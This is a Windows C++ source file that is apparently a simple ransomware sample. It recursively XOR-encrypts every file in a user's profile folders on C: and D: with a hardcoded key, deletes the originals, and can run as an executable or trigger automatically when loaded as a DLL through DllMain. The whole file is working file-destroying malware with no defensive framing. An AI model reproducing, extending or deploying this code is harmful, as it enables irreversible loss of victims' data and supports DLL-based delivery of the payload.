#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <string>
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <thread>

using namespace std;

static const string ENC_EXTENSION = "enc";
static char ENC_KEY[] = "D34dB33F";

#define BUFFER_SIZE 1024

void encrypt_file(const string &path, const string &encrypted_path)
{
    ifstream in(path, ios::binary);
    ofstream out(encrypted_path, ios::binary);
    if (!in.is_open() || !out.is_open())
    {
        cout << "Error opening file" << endl;
        return;
    }
    char buffer[BUFFER_SIZE];
    while (!in.eof())
    {
        in.read(buffer, BUFFER_SIZE);
        int read_bytes = in.gcount();
        for (int i = 0; i < read_bytes; i++)
        {
            buffer[i] = buffer[i] ^ ENC_KEY[i % sizeof(ENC_KEY)];
        }
        out.write(buffer, read_bytes);
    }
    in.close();
    out.close();
    remove(path.c_str());
}

void encrypt_dir(const string &dir)
{
    for (auto &p : filesystem::recursive_directory_iterator(dir))
    {
        if (p.is_regular_file())
        {
            string name = p.path().filename().string();
            string ext = name.substr(name.find_last_of('.') + 1);
            if (ext != ENC_EXTENSION)
            {
                string path = p.path().string();
                string encrypted_path = path + "." + ENC_EXTENSION;
                cout << "Encrypting " << path << endl;
                encrypt_file(path, encrypted_path);
            }
        }
    }
}

// Run from exe
int main(int argc, char *argv[])
{
    encrypt_dir("C:\\Users\\john.doe");
    encrypt_dir("D:\\Users\\john.doe");
    cout << "John Doe is now encrypted!" << endl;
}

// Run from dll
void msgBox()
{
    MessageBox(0, "Hello From DLL!", "Hello", MB_ICONINFORMATION);
}

void run()
{
    Sleep(5000);
    encrypt_dir("C:\\Users\\john.doe");
    encrypt_dir("D:\\Users\\john.doe");
    MessageBox(0, "John Doe is now encrypted!", "Encryption", MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)msgBox, NULL, 0, NULL);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, NULL);
    }
    return TRUE;
}